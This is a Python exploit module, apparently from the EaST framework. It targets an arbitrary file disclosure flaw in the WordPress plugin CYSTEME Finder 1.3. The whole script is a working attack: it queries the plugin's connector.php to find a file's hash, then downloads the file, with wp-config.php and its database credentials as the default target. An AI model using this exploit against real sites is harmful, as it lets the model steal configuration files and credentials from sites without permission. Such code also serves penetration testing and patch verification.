#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
from core.Sploit import Sploit
import urllib2
import json

INFO = {}
INFO['NAME'] = 'wordpress_cysteme_finder_afd'
INFO['DESCRIPTION'] = 'WordPress Plugin CYSTEME Finder 1.3 Arbitrary File Disclosure vulnerability'
INFO['VENDOR'] = 'https://wordpress.org/plugins/cysteme-finder/'
INFO['CVE Name'] = 'N/A'
INFO['NOTES'] = '''
This vulnerability found by http://t0w3ntum.com
'''
INFO['AUTHOR'] = ['T0w3ntum', 't0w3ntum.com']
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40295/', 'http://t0w3ntum.com/']

INFO['CHANGELOG'] = '7 Dec, 2016. Written by Gleg team.'
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1'
OPTIONS['PORT'] = 80
OPTIONS['PATH'] = '/word/'
OPTIONS['FILE NAME'] = '/xampp/htdocs/word/wp-config.php'
OPTIONS['SSL'] = False


class exploit(Sploit):
    def __init__(self, logger=None):
        Sploit.__init__(self, logger=logger, options=OPTIONS)
        self.name = INFO['NAME']
        self.state = 'running'
        return

    def search_file_id(self):
        url = self.url + 'wp-content/plugins/cysteme-finder/php/connector.php'
        url += '?wphome={directory}&cmd=open&init=1&tree=1&wpurl=10'
        url = url.format(directory=self.directory)
        try:
            fd = urllib2.urlopen(url)
            data = fd.read()
        except Exception as e:
            self.log(e)
            return False
        if self.file_name in data:
            data = json.loads(data)
            for i in data['files']:
                if self.file_name in i['name']:
                    if 'dirs' not in i['name']:
                        return i['hash']
                    else:
                        self.log('FILE NAME must be file not dir')
                        return False
        else:
            self.log('File not found please check FILE NAME')
            return False

    def download_file(self, name_hash):
        url = self.url + 'wp-content/plugins/cysteme-finder'
        url += '/php/connector.php?wphome={dir}&cmd=file&'
        url += 'target={file}&download=1&wpurl=10'
        url = url.format(dir=self.directory, file=name_hash)
        try:
            fd = urllib2.urlopen(url)
            data = fd.read()
        except Exception as e:
            self.log(e)
            return False
        self.log('Content of %s' % self.file_name)
        self.log('\n' + data)
        self.log('End File Content')
        return True

    def exploit(self):
        url = 'https://' if self.ssl else 'http://'
        url += self.host + ':' + str(self.port)
        url += self.path if self.path.startswith('/') else '/' + self.path
        url += '/' if not self.path.endswith('/') else ''
        self.url = url
        try:
            self.directory = self.file_name.rsplit('/', 1)
        except:
            self.log('FILENAME must contain full path to file and his name')
            return False
        self.file_name, self.directory = self.directory[1], self.directory[0]
        file_id = self.search_file_id()
        if not file_id:
            return False
        elif self.download_file(file_id):
            return True

    def run(self):
        if self.exploit():
            self.finish(True)
            return 1
        else:
            self.finish(False)
            return 0


if __name__ == '__main__':
    '''
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    '''
    print 'Running exploit %s .. ' % INFO['NAME']
    e = exploit()
    e.run()
